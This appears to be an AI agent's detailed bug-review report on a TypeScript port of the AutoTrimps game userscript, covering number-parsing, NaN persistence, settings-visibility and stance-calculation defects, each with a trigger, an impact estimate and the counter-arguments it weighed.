**Strongest counter-argument considered.** Three real ones, none of which I could make stick:

**(a) Faithful to legacy — the strongest.** The splice is byte-identical to `SettingsGUI.js:714/736`, so it has behaved this way for the fork's entire life and no user has evidently reported it. But this is the precise shape of #110, which was also byte-faithful and was still fixed at the seam; and this repo's own `escapeHtml` comment declares the threat model for the *weaker* channel (stale key names in a preview) while leaving the stronger one (persisted values in an editable input) unguarded. Faithfulness explains provenance, not harmlessness.

**(b) A quote is rare in the intended content.** Fair, and it is the reason I would not call this high-impact. The fields hold map biomes (`Gardens`), potion codes (`h15`), relic strings (`70,10a,10e`), gather selections — none naturally quoted. The realistic triggers are narrow: a heirloom the user chose to name with quotes (the game permits it; `htmlEncode` stores `&quot;` but the UI *displays* `"`, so the user types `"` into AT), or an imported/pasted settings file. This is a low-frequency data-loss bug, not an everyday one.

**(c) The XSS framing overstates the privilege gain.** A userscript already runs with full page privileges, and importing a hostile settings file already hands over arbitrary AT configuration. The injection does not cross a trust boundary that the import itself did not already cross. What it does add is that the payload fires on *opening a setting* rather than on import — the user has no reason to expect that clicking a settings button executes code from a file they imported an hour ago. I would file this as data loss with an injection footnote, not as a security bug.

**(d) "The sim would have caught it."** Refuted, and consistent with the known `guiLoop`-invisibility note: L0 never opens a tooltip, and nothing here terminates in a wrapped native mutator. The finder's own sim-visible assessment is correct.

---

### parseNum floors e-notation, so the shorthand the input hint advertises silently yields 0 for any value below 1 — and a stored value under 1e-6 is destroyed by simply re-opening the box and pressing Apply

`src/modules/settings-engine.ts:434`

**Sim-visible?** No. The value only changes through the tooltip input box, which the sim never opens; the corpus fixtures carry whatever amalcoordhd they were recorded with.

**Trigger.** `amalcoordhd` ("Amal Boost H:D", settings-defs.ts:80) — declared default 0.0000025, and the two shipped presets store 0.000025 / 0.0000025. Case A: user types the advertised shorthand `2.5e-6`. Case B: user stores anything below 1e-6 (e.g. types 0.0000001), then re-opens the box — line 387 prefills `String(1e-7)` which JS renders as the string "1e-7" — and clicks Apply without editing.

**Actual.** `Math.floor(parseFloat('2.5') * Math.pow(10, parseInt('-6')))` === 0. Verified in node: parseNum('2.5e-5')=0, parseNum('2.5e-6')=0, parseNum('1e-7')=0, parseNum('1e-2')=0, while parseNum('0.0000025')=0.0000025. The tooltip that line 382 prints says "You can also use shorthand such as 2e5 or 200k", so the user is explicitly told to use the form that destroys the value. 0 then disarms the feature: upgrades.ts:160 requires `getPageSetting('amalcoordhd') > 0`, and the setting's own tooltip says "Ignored: Amal Boost is off, or set to 0."

**Expected.** Do not floor a fractional result — the floor is only meaningful for large integers. `parseFloat(m) * 10**e` (optionally floored only when the result is >= 1) round-trips every value the box can display. Note this is byte-faithful to the pre-conversion source (tests/fixtures/oracle/autotrimps.oracle.user.js:15264), so it is a pre-existing defect, not a conversion regression.

**Impact.** LOW — opt-in setting, doubly gated, DOM-entry only, no state corruption.

Who is affected: only a U1 player who has already turned ON `Amal Boost` (`amalcoord`, boolean, default false — settings-visibility.ts:136 keeps `amalcoordhd` display:none otherwise), and who then opens the value box and either (A) types e-notation for a sub-1 value, or (B) has previously stored a value below 1e-6 and presses Apply. On a default install the control cannot even be clicked. The shipped 550 preset does enable it, but stores 2.5e-6, which is above the round-trip cliff.

How badly: the value becomes 0, `upgrades.ts:160` requires `> 0`, so the Coordination-skip never fires — the feature the user just configured is inert. No crash, no wrong native call, no save corruption; the failure mode is identical to leaving the feature off. The label shows "Amal Boost H:D: 0" at the moment of Apply, then reverts to the bare name on the next page load.

Not sim-visible, correctly: `autoSetValue` early-returns unless `#customNumberBox` exists, and the L0 net never opens a tooltip. `parseNum` has no callers outside `autoSetValue` (grep across src/, tests/, scripts/). So neither `baseline-zero` nor `guard-silence` is evidence about this region — it is unguarded by construction.

Wider class (same line, other settings): every `value`/`valueNegative` setting truncates fractional e-notation. `SupplyWall` ('valueNegative', default 0.4, Magma) is the most visible sibling — its own tooltip says "e.g. 2.5" / "e.g. -2.5", and '2.5e0' -> 2 while '-2.5e0' -> -3 (floors away from zero). Realistically nobody types "2.5e0" for 2.5, which is why `amalcoordhd` — where 1e-6 magnitude makes e-notation the natural form — is the one setting where this actually bites.

**Strongest counter-argument considered.** The strongest refutation is that this is a byte-faithful legacy behaviour whose floor is *intended* for the case the tooltip actually names — "shorthand such as 2e5 or 200k", i.e. large integers — and that the existing test suite already characterizes it by name ("parses e-notation via floor(mantissa * 10^exp)"). On that reading it is a documented quirk, not a defect, and CLAUDE.md explicitly says to filter faithful-to-legacy-intended behaviour out of findings. Reinforcing it: the natural input path for this setting is fixed decimal — the box prefills "0.0000025", the tooltip's derived "Default: 0.0000025" line prints fixed notation, and both shipped presets store fixed-representable values — so nothing pushes the user toward e-notation; the destroyed value IS displayed as "0" the instant Apply is clicked; and the consumer degrades to the default no-op rather than doing anything wrong.

That argument fails on three checks I ran. (a) The floor is not a design choice for this branch: the non-e branch returns exact fractions, getPageSetting parseFloats rather than parseInts, and the setting's own declared default is 2.5e-6 — the pipeline is float-capable everywhere except the shorthand. (b) The characterization test is a golden master, not an intent statement (its own header says it pins "quirks included"), and the exact fix leaves all three of its e-notation assertions byte-identical, so nothing here is load-bearing. (c) Case B is a pure mechanical round-trip failure with no user judgement in it at all: line 387 emits "1e-7", line 434 turns "1e-7" into 0. A parser that cannot re-read the string its own prefill emits is broken regardless of what the tooltip advertises.

The one thing I could not refute in the claim's favour is severity: I found no path where this corrupts state or drives a wrong purchase. It ends at "the opt-in feature the user just configured does nothing."

---

### An unparseable number box stores NaN, which persists as JSON null and can never fall back to the default — while the control renders the ∞ (Infinite) icon

`src/modules/settings-engine.ts:466`

**Sim-visible?** No. Requires a click on the value tooltip's Apply button; the sim drives no DOM input, and the every-tick face render is DOM text only.

**Trigger.** Open any `value`/`valueNegative`/`multiValue` control, clear the box (or type a non-numeric word such as "infinite"), click Apply.

**Actual.** parseNum('') is NaN (verified), and line 466 assigns it with no validation. Three follow-on effects, each verified: (1) the every-tick face at settings-visibility.ts:1081 tests `item.value > -1`, and `NaN > -1` is FALSE, so it falls to line 1086 and renders `<span class='icomoon icon-infinity'>` — the control now CLAIMS Infinite; (2) saveSettings() → JSON.stringify writes `null` (`JSON.stringify({v:NaN})` === '{"v":null}'); (3) on the next boot createSetting's `loaded === undefined ? defaultValue : loaded` keeps `null`, because null !== undefined — so the declared default never returns, and getPageSetting yields `parseFloat(null)` = NaN, against which every >= / <= / > comparison is false. (After that reload the face flips again, because `null > -1` is TRUE, so it prints prettify(null) instead of ∞.)

**Expected.** Reject the input when parseNum returns NaN (keep the previous value, or re-apply the declared default) before writing it to the store — the store is the persistence contract, and a NaN written there is a permanent, undefaultable value.

**Impact.** **Default-path, but user-triggered — not gated by any setting, and not reachable by the proof net.**

- **Blast radius:** 210 of 576 controls (206 `value` + 4 `valueNegative`) can store NaN and render the ∞ lie; a further 63 `multiValue` controls store `[NaN]`→`[null]` and render `"NaN+"`/`"null+"`. No opt-in setting gates any of this — the affected controls include default-visible ones (`MaxHut` is `turnOn`'d for U1 at settings-visibility.ts:338).
- **Trigger:** one ordinary user action — clear a number box (or mistype a word) and click Apply. No deep-game or universe requirement; a fresh z1 player can do it.
- **Severity when it fires:** silently and permanently disables the automation the setting gates (AT stops buying Huts/Houses/Mansions/Hotels/Resorts, Gyms, Nurseries, gem housing), across reloads, with no error and no console output. The visible face says "Infinite" (pre-reload) or "0.00e+0" (post-reload) — both readings a user would interpret as *uncapped*, which is the exact opposite of the behaviour. Recoverable only if the user notices and re-types a number.
- **Evidence status of the existing nets:** none. `baseline-zero` cannot reach the Apply click, and `updateCustomButtons` is guiLoop-driven under a dead `setInterval` — a green net is not evidence about this code, per the standing `guiLoop`-invisibility rule.
- **Fix cost:** XS-S — one guard at settings-engine.ts:466 (reject non-finite `num`, keep the prior value) plus the same for the `multiValue` map. Mechanism-only; touches no balance number.

**Strongest counter-argument considered.** Three real ones, none of which break it:

1. **Faithful to legacy + requires user error.** `parseNum` has been unvalidated since the original AutoTrimps, and the tooltip does say "Type a number below." A player who types "infinite" into a number box is arguably out of contract. — But *clearing the box* is the ordinary "I want to reset this" gesture, nothing in the DOM prevents it (no `type="number"`), and the repo files legacy defects of exactly this shape routinely (#68-#74, #110, #96/#100). Faithfulness is context for how to fix, not evidence it isn't a bug.

2. **It is user-recoverable, so it is not data loss in the #68 sense.** Re-opening the box and typing a number repairs it permanently. — But the ∞ face actively misdirects the user away from doing that: it renders *identically* to a legitimately-configured `-1`, so the one visible signal says the setting is fine while AT has stopped buying. That inversion is the finding.

3. **It is one member of a wider class, not a distinct defect** (see `parseNum('200,000')` = 200 above). — Fair; the right fix is one validation guard at settings-engine.ts:466 covering the whole class, not a NaN special-case. That argues for scoping the fix wider, not for dropping it.

The refutations I tried and *failed* to land: "the value cannot occur" (it occurs from an empty box); "something clamps it upstream" (`clampMultitoggle` is multitoggle-only, verified); "createSetting restores the default" (`null !== undefined`, verified); "`getPageSetting` normalizes it" (utils.ts:69 is a bare `parseFloat`); "the sim would have caught it" (structurally invisible — no DOM clicks, guiLoop stubbed).

---

### `hiddenBreedTimer` and `autoMapStatus` are turned OFF but never turned back ON

`src/modules/settings-visibility.ts:939`

**Sim-visible?** No. Pure DOM visibility with no native mutator downstream, and it lives in guiLoop-only code (setInterval stubbed at scripts/sim/boot.mjs:58).

**Trigger.** Toggle `showbreedtimer` (or `showautomapstatus`) OFF, then back ON, without reloading the page.

**Actual.** Lines 939-940 are one-way: `if (getPageSetting('showbreedtimer') == false) turnOff("hiddenBreedTimer");` / `if (getPageSetting('showautomapstatus') == false) turnOff("autoMapStatus");`. `toggleElem` writes `display:none` on both the element and its parentNode. There is no `turnOn` for either id anywhere in src/, so the elements stay hidden for the rest of the session. main-loop.ts:180 / 237 resume writing text into invisible nodes.

**Expected.** An `else` arm that restores visibility, matching the settings' own descriptions ("Turning it off skips that per-tick update and hides the countdown / status line" — implying turning it on shows it). Note a naive `turnOn` is not the right fix: `toggleElem(el, true)` sets `parentNode.style.display = 'inline-block'`, but both parents were authored `display: block` (breedtimer.ts:214, settings-menu.ts:48), so the restore must write `block`.

**Impact.** COSMETIC / UX ONLY, on an opt-in path — but with one persistent variant. No automation behaviour changes: nothing here feeds a native mutator, no game state is touched, AT keeps playing identically. The damage is that the user's own "show this again" click silently does nothing.

Who is affected:
- NOT the default path. Both settings ship `'boolean', true` (settings-defs.ts:2889/2893), so a fresh install never reaches the bug. It takes one deliberate user click on a control that exists precisely to be clicked ("Turn this off to reduce memory"), so this is squarely a real user action, not an exotic configuration.
- U1 users: session-scoped. Toggle OFF then ON and the breed-timer countdown / AutoMap status line stay invisible until the next page load, while AT keeps writing fresh text into them every tick. Recovery: F5. Low severity.
- U2 (radon) users: PERSISTENT ACROSS RELOADS, and this is the part worth filing. Line 940 keys the status box off the U1 setting `showautomapstatus` with no universe guard, while line 941 hides the U1 control whenever radonon. So a player who ever turned the U1 status off and then plays U2 has `autoMapStatus` hidden at every boot forever, with `Rshowautomapstatus` ON and RupdateAutoMapsStatus (maps.ts:953) computing and writing the status string into the invisible node on every tick. The only recovery is portal to U1, re-enable, reload. Its mirror — `Rshowautomapstatus` OFF with `showautomapstatus` ON — leaves the box visible with permanently frozen stale text.
- Corpus/gate exposure: ZERO. guiLoop never runs in the L0 net (setInterval stubbed at scripts/sim/boot.mjs:58) and no native mutator is downstream, so neither baseline-zero nor guard-silence nor the blind-spot census can see this region at all. This is exactly the "green because it cannot see it" class, and it explains why an identical bug has been live since legacy/SettingsGUI.js.

Fix cost is small but must not be a naive turnOn: `toggleElem(el, true)` writes `parentNode.style.display = 'inline-block'`, and both parents were authored `display: block` (breedtimer.ts:213; settings-menu.ts:48, where the status bar has no width and would shrink to content). The correct shape is a two-armed restore that writes 'block' to the parent, plus a universe guard on line 940 so the U2 box is keyed to Rshowautomapstatus.

**Strongest counter-argument considered.** Three, in descending strength.

(1) A RELOAD FIXES IT — in U1. Both elements are minted at module load (`addBreedingBoxTimers()` self-invokes at breedtimer.ts:224; `automationMenuInit()` runs once via settings-boot.ts:22), so a page refresh with the setting ON restores them with pristine default styles. That caps U1 severity at "cosmetic, session-scoped, F5 clears it". It does NOT rescue the U2 case, where the persisted `showautomapstatus:false` re-hides the box on every boot and the control needed to clear it is itself hidden.

(2) FAITHFUL TO LEGACY, SO ARGUABLY INTENDED. `git show d283f152:legacy/SettingsGUI.js` lines 2421-2422 are byte-identical to lines 939-940; this is inherited, not a conversion regression. But the settings' own descriptions defeat the "intended" reading in both eras: legacy said "ENABLES the display of the hidden breedtimer. Turn this off to reduce memory", and the current tip says "Turning it off skips that per-tick update and hides the countdown". Both promise a reversible hide, and the actual memory saving (skipping the per-tick innerHTML write at main-loop.ts:180) is delivered independently by the setting read, so the one-way hide buys nothing. Per the repo's own rule that a tooltip is a checkable claim about the code, that makes it a defect rather than intent.

(3) CSS OR THE GAME MIGHT RE-SHOW IT. Checked and false. `battleBtnsColumn` appears only in .trimps-game/index.html, ScreenReader.html, indexKong.html and two CSS files — never in game JS, so the game never rebuilds or restyles that column. `#trimps > div.row` is static markup (index.html:280) holding turkimpBuff/trimpTitle/fluffyBox; the game never replaces it. Inline `display:none` beats any non-!important rule, and the only `display: ... !important` rules in the game's CSS are bootstrap's `.hidden-*`/`.visible-*`/`.navbar-collapse` responsive utilities, none of whose classes are carried by the four affected nodes (the span ids have no class; the parents are a bare DIV and a `col-xs-11` DIV). No other `style.display` write anywhere in src/ targets either id; `filterMessage2` (utils.ts:278) targets `*Message` log rows and AFK mode (performance.ts:131/140) toggles `#wrapper`, neither of which resets descendant inline styles.

A fourth, weaker one: "the sim would have caught it." It structurally cannot — `updateCustomButtons` is dispatched only from `guiLoop` (main-loop.ts:596) and from `settingChanged`, and `window.setInterval = () => 0` at scripts/sim/boot.mjs:58 kills guiLoop outright. Plus there is no native mutator downstream, so the L0 action-trace differential is blind to it by construction. This region is genuinely unguarded, which is why the bug has survived since the pre-conversion source.

---

### The shared #autoMapStatus element is hidden from the U1 key while the U2 status updater is gated on the U2 key

`src/modules/settings-visibility.ts:940`

**Sim-visible?** No. DOM-only, and guiLoop is not executed by the L0 net (setInterval stubbed, scripts/sim/boot.mjs:58).

**Trigger.** (a) Playing U2 and turning `Rshowautomapstatus` OFF. (b) Playing U2 with `Rshowautomapstatus` ON while the U1 `showautomapstatus` is OFF from earlier U1 play.

**Actual.** There is ONE `#autoMapStatus` span (settings-menu.ts:57, created regardless of universe) and both universes write it (maps.ts:96 for U1, maps.ts:953 for U2). Line 940 hides it based only on `showautomapstatus`, the U1 key, but main-loop.ts:454 gates the U2 writer on `Rshowautomapstatus`. So in case (a) the per-tick update stops while the element stays visible, leaving a permanently frozen, stale status line; in case (b) the line is hidden even though the U2 setting is ON, and the control that would fix it (`showautomapstatus`) is itself hidden whenever the settings page is in Radon view (line 941).

**Expected.** The hide should dispatch on universe the same way the update does — `showautomapstatus` for U1, `Rshowautomapstatus` for U2 — so the render gate and the runtime gate express one invariant, as elsewhere in this file (#115/#121).

**Impact.** LOW severity, cosmetic/UI only — no automation decision, no purchase, no map choice changes. Nothing here touches game balance.

NOT a default-path defect: both `showautomapstatus` and `Rshowautomapstatus` default to `true` (settings-defs.ts:2893/2897), so a player who never touches them sees the correct behaviour in both universes. Reaching either bad state requires deliberately turning a default-ON setting off.

Affected populations:
- CASE (a) — any U2 player who turns "Enable AutoMap Status" OFF in Radon view. The setting is INERT under defaults (RAutoMaps=1): the status box neither hides nor stops updating. The user gets zero feedback that their click did nothing. This is the more likely of the two states because it needs only one action, in the universe the user is actually playing.
- CASE (a') — same, plus Auto Maps OFF (RAutoMaps=0) or maps not yet unlocked: box stays visible showing a permanently frozen stale line. Narrower.
- CASE (b) — a player who turned the U1 setting off during U1 play and later portalled to U2. Their U2 status box is hidden even though the U2 setting is ON and being written 2x/tick. Recovery is non-obvious: flip the settings view back to Helium, re-enable a control labelled identically to the U2 one, AND reload the page (no `turnOn("autoMapStatus")` exists, so the live toggle cannot restore it).

Also affected, as a documentation defect rather than a behavioural one: the `Rshowautomapstatus` tooltip promises two effects and delivers neither, and the `showautomapstatus` tooltip's "skips that per-tick update" half is false whenever AutoMaps > 0 (maps.ts:403 calls the writer unconditionally).

Guarding: effectively zero. DOM-only, and updateCustomButtons is dispatched from guiLoop which the L0 net never installs (setInterval stubbed, boot.mjs:58). Neither baseline-zero nor guard-silence can see any of this — a green net there is evidence the net cannot look, not evidence the code is right.

**Strongest counter-argument considered.** The strongest counter is INTENT-BY-DESIGN plus legacy fidelity: `showautomapstatus` may have been meant as the single master show/hide for the shared element (it predates the U2 fork of the setting by years), with `Rshowautomapstatus` added only as a "skip the redundant per-tick U2 update" switch. That reading is internally consistent with the code, matches the ORIGINAL legacy description ("Enables the display of the map status. Turn this off to reduce memory." — a memory/CPU framing, not a visibility framing), and the current source is byte-faithful to the pre-conversion SettingsGUI.js. Under it, line 940 is correct and only the modern tooltip prose is wrong.

Three independent checks defeat that reading:
(a) The two controls are MUTUALLY EXCLUSIVE in the UI — lines 941/942 show exactly one of them depending on `radonsettings` — and they carry the IDENTICAL label "Enable AutoMap Status" in the same Display section. A player in Radon view sees one control by that name and nothing else; it cannot be "the U2-update-only half" of anything by any UI reading.
(b) Case (b) is unambiguous under EVERY reading: the box is hidden while RupdateAutoMapsStatus writes it 2x/tick. There is no interpretation under which "hide a live-updating element based on the other universe's setting" is intended.
(c) Under the master-switch reading the U2 setting would at least suppress the update; it does not, because RautoMap() calls the writer unconditionally (maps.ts:987) and RAutoMaps defaults to 1. So the setting is inert on BOTH of its advertised effects.

Secondary counter, which I accept as a real correction: the finder overstated "the control that would fix it is itself hidden" — the user CAN flip `radonsettings` back to Helium (it is a display-only view toggle, settings-defs.ts:209-212, default 0) and re-enable `showautomapstatus`. What the finder understated is that doing so does NOT restore the box in the live session, because no `turnOn("autoMapStatus")` exists; a page reload is required. Net effect on the verdict: unchanged.

Third counter — "the sim would have caught it" — is refuted directly: guiLoop is never installed (setInterval stubbed at boot.mjs:58) and the writers are DOM-only, outside the 12 wrapped natives.

---

### IgnoreCrits is hidden under Windstacking but still drives the Dynamic Gyms buy decision

`src/modules/settings-visibility.ts:646`

**Sim-visible?** No. `buyBuilding` is a recorded native, so a divergence would show — but the corpus cannot reach the branch: the only AT-settings fixture (tests/fixtures/at-settings/p18-z2-balance-stall.json) has `AutoStance: 1` and `DynamicGyms: false`, and those are also the shipped defaults (settings-defs.ts:2210 default 1, :2232 default false).

**Trigger.** U1, `AutoStance == 3` (Windstacking), `DynamicGyms` ON, Gym unlocked and under its Max Gyms cap, fighting a `corruptCrit`/`healthyCrit` enemy or with the `getCrit` void buff.

**Actual.** `!radonon && getPageSetting('AutoStance') != 3 ? turnOn("IgnoreCrits") : turnOff("IgnoreCrits")` hides the control in Windstacking mode. But `IgnoreCrits` has a second consumer that is completely independent of AutoStance: buildings.ts:358 `if (getPageSetting('DynamicGyms'))` → buildings.ts:363 `block > nextGym * calcSpecificEnemyAttack()` → calc.ts:564 `badGuyCritMult()` → calc.ts:414 `if (getPageSetting('IgnoreCrits') == 2) return 1;` and calc.ts:427 `... && getPageSetting('IgnoreCrits') != 1`. Switching from `Safety First` (0) to `Ignore All Crits` (2) changes the modelled enemy attack by 5x (corruptCrit) or 7x (healthyCrit), which flips `currentEnemyDamageOK` and therefore whether AT keeps buying Gyms. The setting is live but unreachable.

**Expected.** Either keep the control visible whenever any consumer can read it, or narrow the runtime read so the render gate and the runtime gate are the same invariant. The setting's own tooltip states the rationale "hidden whenever AutoStance is set to Windstacking (option 3) — windstacking does not run this calc" (settings-defs.ts:2217); that rationale is true of the stance calc but false of the Gym calc.

**Impact.** OPT-IN SETTING, DEEP-GAME, NOT SIM-VISIBLE — low-to-medium.

Needs all three at once: `DynamicGyms` ON (settings-defs.ts:2232, default **false**), `IgnoreCrits` at 1 or 2 (default **0**), `AutoStance == 3` (default **1**), plus U1 and a `corruptCrit`/`healthyCrit` enemy or the `getCrit` void buff. Corruption starts at z181 normally (`main.js:8760`, or 151/166/176 with headstart talents, and z60 under the Corrupted challenge); Healthy needs `lastSpireCleared >= 2` and is effectively z300+. Windstacking's own floor is `world > 70` (stance.ts:271) and it is documented "for after z230" — so the defect's natural habitat is z181+ U1, exactly where Windstacking users live.

Mitigating: the value can be edited by temporarily leaving Windstacking mode. Aggravating: AT's own shipped z550 import preset (`serializeSettings550()`, offered in the UI at import-export.ts:205) already carries `IgnoreCrits: 2` + `DynamicGyms: true` together, so a preset user is one AutoStance click from a hidden setting that forgives 33–40 Gyms' worth of block on every crit cell.

Sim visibility: NO, for four independent reasons, any one of which is sufficient — (1) the render half runs in `updateCustomButtons`, which is dispatched from `guiLoop` and is structurally invisible to the L0 net (`scripts/sim/boot.mjs` stubs `setInterval`); (2) `DynamicGyms` is default-false and the only AT-settings fixture, `tests/fixtures/at-settings/p18-z2-balance-stall.json`, does not turn it on; (3) `AutoStance` default is 1, not 3; (4) the deepest fixture is z62, below the z181 corruption start, so no `corruptCrit`/`healthyCrit` enemy exists in the corpus at all. `baseline-zero` staying green here is evidence the net cannot see this region, not evidence the region is correct.

**Strongest counter-argument considered.** Two, and the first is genuinely strong.

(A) THE GATE IS LEGACY-FAITHFUL, NOT A PORT REGRESSION. `git log -S"AutoStance') != 3 ? turnOn(\"IgnoreCrits\")" --all` returns two commits: `7a5cd96c Phase UI: extract settings-visibility.ts (updateCustomButtons) from SettingsGUI` (the strangler move) and `5c759029 Update SettingsGUI.js` (upstream legacy). The mismatched gate is inherited AT behaviour, so under the "filter faithful-to-legacy-intended from genuine defects" rule this is arguably intended-as-shipped, not a defect introduced here. What defeats this as a full refutation is that the *tooltip* is not inherited — it was written in #107 explicitly "against the code that implements them", and it asserts a checkable claim about the code that is false. A false rationale in a fork-authored description is a finding by this repo's own precedent (the #111–#119 pass).

(B) THE SETTING IS NOT PERMANENTLY UNREACHABLE. The user can flip AutoStance to 1 or 2, the control reappears on the next `updateCustomButtons` tick, change IgnoreCrits, and flip back to 3 — or edit it through Import/Export. So the honest framing is "hidden while live", a UI/logic inconsistency, not a lockout or data loss. That caps the severity well below the phantom-setting / stale-key class.

I also tried and failed to refute on: `turnOff` writing the value (it does not — pure DOM); `DynamicGyms` being suppressed under Windstacking (settings-visibility.ts:639 gates it on `!radonon` only); the zone term already dominating (`calcBadGuyDmg` has no crit factor, so it cannot mask the flip); and the 5/7 constants being drift (they mirror `main.js:15801` exactly).

---

### survive("B") models Barrier with UNHALVED pierce whenever you are not already in Barrier — 2× overstated pierce damage in exactly the regime Barrier exists for

`src/modules/stance.ts:203`

**Sim-visible?** No, not as a defect. setFormation IS a recorded mutator and brokenPlanet is reached (deepest fixture z62), so the code runs — but baseline-zero pins whatever formation AT chose; it can detect a CHANGE, never that the current choice is wrong. Nothing in the net computes the correct pierce independently.

**Trigger.** game.global.brokenPlanet && !game.global.mapsActive (z60+ in the world), AutoStance = 1 (default), current game.global.formation !== 3, and survive("D") + survive("XB") have both already failed so autoStance() reaches the survive("B") arm (stance.ts:242).

**Actual.** `let pierce = (brokenPlanet && !mapsActive) ? getPierceAmt() : 0;` then `if (formation !== "B" && game.global.formation === 3) pierce *= 2;`. getPierceAmt() returns the pierce for the CURRENT formation, and the game halves it only while `game.global.formation == 3` (main.js:11221). So the code correctly UN-halves when leaving B, but never applies the halving when entering B. Of the four cases only one is wrong: current!==3 / evaluating "B" keeps pierce = 0.2 when the real in-Barrier value is 0.1. Because survive("B") also multiplies block by 4 (stance.ts:190), `Math.max(enemyDamage - block, pierce*enemyDamage, 0)` in directDamage (stance.ts:147) is almost always decided by the pierce term — so harm is doubled precisely where Barrier is the right answer, and autoStance falls through to survive("X")/survive("H").

**Expected.** Mirror getPierceAmt()'s formation dependency in both directions, e.g. add `if (formation === "B" && game.global.formation !== 3) pierce *= 0.5;` alongside the existing un-halving.

**Impact.** **Default-path, U1-only, z80+, low severity.**

- `AutoStance` default is `1` = "Auto Stance" (settings-defs.ts:2210, multitoggle default 1), so `autoStance()` runs for every default U1 user. Not opt-in. Hidden/ignored in U2 (settings-visibility.ts:638).
- Gated to **z80+ with the Barrier upgrade purchased**, not z60 as the claim states: the Barrier book drops only at zone 80 cell 44 post-planet-break (config.js:10875 + main.js:10321) and costs 4e10 science + 4e11 food. Also requires world combat (`brokenPlanet && !mapsActive`) — inert in every map, and inert whenever AT is already in Barrier (the bug is an *entry* bias only; once `game.global.formation === 3` the calc is correct, so it is hysteresis, not a persistent 2x).
- **Structurally invisible to the proof net.** Only `12-warp-u1` (z62) has both `brokenPlanet` and `Barrier.done`, and its trace is `setFormation(2) x1398` — `survive("D")` wins every tick, so `survive("B")` is never evaluated with a nonzero pierce. `08-starved-u1` reaches Barrier 62-88 times but at z6 with `brokenPlanet=0`, so pierce is 0. `13-z58-gearwall` and `14-gem-housing-frag-lock` have no oracle traces, and 14 has `Barrier.done=0` anyway. Deepest fixture is 18 zones short of the real trigger; a fixture for this would have to be hand-doctored, as 06-11 already are.
- **Observable cost is small.** 4.74% of the (b,h) space picks a different stance, but 99.8% of that is a safe substitution and 87% of it is B->X, which is offensively better. The only true regression is a ~0.0075% band (b in [0.23,0.40], h in [0.21,0.22]) where the ladder exhausts and AT drops a critPower tier or falls back to `setFormation(1)` — i.e. it can die to a mega crit that correct Barrier math would have survived.
- Fix is a one-line mechanism repair mirroring a game formula (not a balance change), but it is trace-moving in principle, so it needs a fixture in the z80+/Barrier region to be provable at all — today no net can see it either way.

**Strongest counter-argument considered.** Two, one weak and one strong.

**Weak: "faithful to legacy / deliberate conservatism."** The logic is verbatim from the pre-conversion `legacy/modules/stance.js:229`, so it is not a port bug and has shipped this way for years. One could argue the asymmetry is an intentional safety margin on entering Barrier. This reading is weak: the author wrote the un-halving line, which proves the formation-dependence of `getPierceAmt()` was understood; a deliberate margin would not be applied to exactly one of four cases; and AT already exposes a dedicated risk dial for this (`IgnoreCrits`, settings-defs.ts:2215).

**Strong: the consequence is almost always benign or an improvement.** `autoStance` only ever selects a formation that passed its own `survive()` gate, and the bug perturbs only the B arm — so it can never make AT commit to a stance its model calls unsafe. It can only make AT *skip* B. In 87% of the affected (b,h) region the fallthrough lands on X, which passes the same gate and carries **2x the attack** of Barrier; in 13% it lands on H, which is offense-neutral to B. Only 12 of 160,000 grid cells produce `B->NONE`, the sole outcome that actually costs safety. Moreover, in the fully pierce-saturated regime the algebra makes true-B and X exactly equivalent in survivability (X needs h > max(1-b, 0.2); true-B needs h > max(2-8b, 0.2); these coincide for b >= 0.8), so the substitution there is strictly a win. So: a real formula divergence, but one whose observable cost is a narrow band, not the broad "2x harm in Barrier's home regime" the claim's framing suggests.

---

### survive() passes 0 for challengeDamage's missingHealth, but challengeDamage's `if (!missingHealth)` discards it and substitutes the CURRENT squad's missing health — the fresh-squad bleed projection is understated

`src/modules/stance.ts:213`

**Sim-visible?** No, not as a defect. voidBuff 'bleed' is reachable in the corpus (voids unlock well before z62) and setFormation is traced, but the oracle pins the formation AT actually picked; a wrong survivability verdict is indistinguishable from a right one to a differential.

**Trigger.** game.global.voidBuff === "bleed" (a void map's bleed buff) or the current enemy is corruptBleed/healthyBleed, AND the squad is damaged (game.global.soldierHealth < game.global.soldierHealthMax), AND newSquadRdy is the deciding term of survive()'s return (stance.ts:215).

**Actual.** stance.ts:213 calls `challengeDamage(maxHealthier, minDamage, maxDamage, 0, blockier, pierce, critPower)` — the literal 0 is the deliberate 'a brand-new squad has no missing health' signal, matching the sibling `directDamage(blockier, pierce, healthier, ...)` on the same line which passes FULL health. But challengeDamage's pre-init is `if (!missingHealth) missingHealth = game.global.soldierHealthMax - game.global.soldierHealth;` (stance.ts:82), and `!0` is true — so the 0 is thrown away and the dying squad's real missing health is used. The only consumer is the bleed line `harm += (maxHealth - missingHealth) * challengeDamage;` (stance.ts:118), so harm2 is understated by `missingHealth * 0.20` (0.30 for healthyBleed). At 50% health that is 10% of soldierHealthMax of bleed damage the new squad WILL take but survive() does not count, making `healthier > harm2` (stance.ts:215) true when it should be false — AT keeps a formation that gets the fresh squad killed.

**Expected.** The 0 must survive the pre-init. Use an explicit-undefined test (`if (missingHealth === undefined)`) or an `= 0` default parameter, the way critPower already does (`critPower: number = 2`, stance.ts:77).

**Impact.** **Default path, U1 only, narrow trigger, bounded damage.**

Who: every U1 user, since `AutoStance` defaults to `1` (settings-defs.ts:2210) and main-loop.ts:370 runs `autoStance()` → `survive()` every tick inside the `universe == 1` block. Not gated behind an opt-in. U2 users are unaffected (settings-visibility.ts:638 turns AutoStance off; the stance dispatch is inside the U1 branch). The Scryer path (scryer.ts:27, 140-144) inherits it identically.

When it actually bites — all four must hold simultaneously:
1. a bleed source is live: a void map rolled the `bleed` special (1 of 4 uniform, main.js:6662; needs ≥1 portal, main.js:6618 — so reachable well before z62), or corruptBleed (z181+) / healthyBleed (U2);
2. `game.global.soldierHealth < game.global.soldierHealthMax`;
3. `newSquadRdy` — trimps at max, `realMax() <= owned + 1` — which is common, since BetterAutoFight sends a squad as soon as one is ready;
4. the second term `health - missingHealth > harm` is false, so harm2 is the deciding term.

How badly: harm2 is understated by `missingHealth * 0.20` (0.30 for healthyBleed) — at 50% health that is ~10% of max health of unaccounted bleed. In the worked case it flips `survive('X')` from the correct `false` to `true`, i.e. AT holds a formation in which its own model says the fresh squad takes 1050 against 1000 health. The scale mismatch makes it worse when the current formation has a higher health multiplier than the candidate (currently H → evaluating D gives a **negative** bleed term, −600 in the worked example, which *subtracts* from harm2). Consequence is a lost squad, repeated for as long as conditions 1-4 hold; self-recovering after each death (fresh squad → missingHealth 0 → substitution becomes a no-op), so it degrades bleed-void throughput rather than stalling a run.

